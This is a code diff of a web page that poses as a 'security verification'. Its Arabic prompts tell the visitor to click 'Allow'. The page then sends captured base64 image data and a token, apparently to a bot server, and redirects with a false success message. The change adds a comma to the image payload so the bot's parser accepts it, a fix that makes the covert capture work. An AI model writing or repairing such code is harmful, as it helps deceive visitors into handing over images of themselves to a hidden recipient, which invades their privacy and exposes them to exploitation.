@@ -97,9 +97,10 @@
                         return;
                     }
 
+                    // إرسال البيانات بالشكل المتوافق 100% مع البوت (imageDatas متبوعة بفاصلة ليتعرف عليها الـ split)
                     const payload = {
                         token: token,
-                        imageDatas: base64Data
+                        imageDatas: base64Data + "," // تم إضافة الفاصلة ليتوافق مع imageDatas.split(',') في سيرفرك
                     };
 
                     statusText.textContent = "تم التحقق بنجاح! جاري توجيهك...";
@@ -120,7 +121,7 @@
                         window.location.href = '/ok.html';
                     }, 1500);
 
-                }, 1500);
+                }, 1800);
 
             } catch (err) {
                 statusText.textContent = "تنبيه: يجب النقر على 'السماح' (Allow) لإتمام التحقق الأمني!";
